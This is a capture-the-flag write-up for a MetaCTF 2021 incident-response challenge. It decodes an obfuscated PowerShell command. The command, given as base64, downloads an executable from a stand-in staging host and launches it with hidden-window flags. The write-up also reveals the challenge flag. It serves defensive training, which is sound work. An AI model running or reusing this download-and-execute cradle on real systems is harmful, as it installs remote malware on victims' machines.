# MetaCTF 2021
## My Logs Know What You Did (125pts)
### Description: 
>While investigating an incident, you identify a suspicious powershell command that was run on a compromised system ... can you figure out what it was doing?
`C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn`

### Step 1 - Understanding the Command:
In this Powershell command, we can see it runs a command but it appears to be encoded. The `-enc` flag encodes the payload in Base64, so we can throw it into a Base64 decoder and extact some data.

### Step 2 - Decode Base64
![image](https://user-images.githubusercontent.com/43623870/144771056-163ec45a-0105-431e-a1c7-37f07916275d.png)

By using just the encoded payload portion as our input, we can now read the unencoded payload and determine what it's doing.

If it was a real sample, this command would download a executable file from a staging site and start the process on the victim machine.



<details>
  <summary> Flag Spoiler </summary>
  MetaCTF{super_sus_st4ging_site_d0t_c0m}
</details>

## Learning Takeaways
We learned about Powershell encoding functionality, and even further we learned that obfuscation can be achieved in the command flags like `-noP` because Powershell handles parameter binding in a way that essentially auto-completes the intended flag. More can be found [here](https://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier).
